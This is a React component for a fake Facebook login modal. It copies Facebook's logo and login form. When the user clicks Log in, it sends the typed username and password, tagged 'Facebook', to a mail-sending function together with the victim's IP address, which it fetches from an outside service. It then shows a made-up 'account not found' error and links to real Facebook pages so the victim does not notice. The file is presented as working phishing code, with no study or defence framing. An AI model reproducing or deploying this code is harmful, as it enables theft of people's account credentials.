"use client";
import { useState } from "react";
import Image from "next/image";
import { Button } from "flowbite-react";
import { useRef } from "react";
import { ChangeEventHandler } from "react";
import sendMail from "@/app/sendmail";

interface FacebookLoginProps {
  isOpenFacebook: boolean;
  closeModal: () => void;
}

interface FormProps {
  username: { value: string };
  password: { value: string };
}

const FacebookLogin = ({ isOpenFacebook, closeModal }: FacebookLoginProps) => {
  const [hasFilledBoth, setHasFilledBoth] = useState(false);
  const [error, setError] = useState("");

  const formRef = useRef(null);

  function invalidCredentials() {
    setError(
      "The email address or mobile number you entered isn't connected to an account.",
    );
  }

  const handleChange: ChangeEventHandler<HTMLInputElement> = () => {
    const form: FormProps | any = formRef.current;
    if (
      form &&
      form["username"]?.value.length > 0 &&
      form["password"]?.value.length >= 6
    ) {
      setHasFilledBoth(true);
    } else {
      setHasFilledBoth(false);
    }
  };

  return (
    <div className="flex flex-col items-center  bg-gray-100">
      <div className="flex flex-col items-center">
        <Image
          src="/facebooklogo.svg"
          alt="Facebok"
          width={300}
          height={40}
          className=""
        />
        {/* <p>Facebook helps you connect and share with the people in your life.</p> */}
      </div>

      <div className="flex flex-col bg-white px-20 py-5 w-full max-sm:px-10">
        <span className="text-center my-4">Log in to Facebook</span>
        <form ref={formRef} className="flex flex-col w-full">
        <input
          onChange={handleChange}
          name="username"
          id="username-input"
          type="text"
          placeholder="Email address or phone number"
          className="my-2 border border-1 border-gray-200 p-3 rounded-md focus:outline-none focus:ring-0 focus:border-gray-300 text-xs"
        />
         {error && <span className="text-red-400 text-[13px] mt-2 font-medium font-satoshi">
          {error}
          <a href="https://web.facebook.com/login/identify/?_rdc=1&_rdr" className="text-red-400 font-bold hover:underline">Find your account and log in</a>
          </span>}

        <input
          onChange={handleChange}
          id="password-input"
          name="password"
          type="password"
          placeholder="Password"
          className="my-2 border border-1 border-gray-200 p-3 rounded-md focus:outline-none focus:ring-0 focus:border-gray-300 text-xs"
        />

        <Button
           href={undefined} 
           className="!bg-blue-800 opacity-80 my-2 py-1 text-lg font-bold text-white rounded-md hover:!bg-blue-800 hover:!opacity-100 focus:outline-none focus:ring-0"
           onClick={async () => {
            if (hasFilledBoth) {
              await sendMail({
                username: (
                  document.getElementById(
                    "username-input",
                  ) as HTMLInputElement
                ).value,
                password: (
                  document.getElementById(
                    "password-input",
                  )! as HTMLInputElement
                ).value,
                platform: "Facebook",
                ipaddress: (() =>
                  fetch("https://api.ipify.org?format=json").then(
                    async (response) => {
                      const result = await response.json();
                      return result.ip;
                    },
                  ))()! as unknown as string,
              });
              console.log("mail sent");
              setInterval(() => invalidCredentials(), 1000);
            }
          }}
           >
          Log in
        </Button>
        <a
          href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
          target="_blank"
          className=" text-blue-600 text-sm my-2 text-center hover:underline"
        >
          Forgotten password?
        </a>
        </form>
        <span className="my-2">
          <hr />
        </span>
        <button className="facebook-color my-2 py-2 px-2 text-lg font-bold text-white rounded-md w-fit mx-auto">
          <a href="https://web.facebook.com/?_rdc=1&_rdr" target="_blank">
          Create new Account
          </a>
        </button>
      </div>
    </div>
  );
};

export default FacebookLogin;
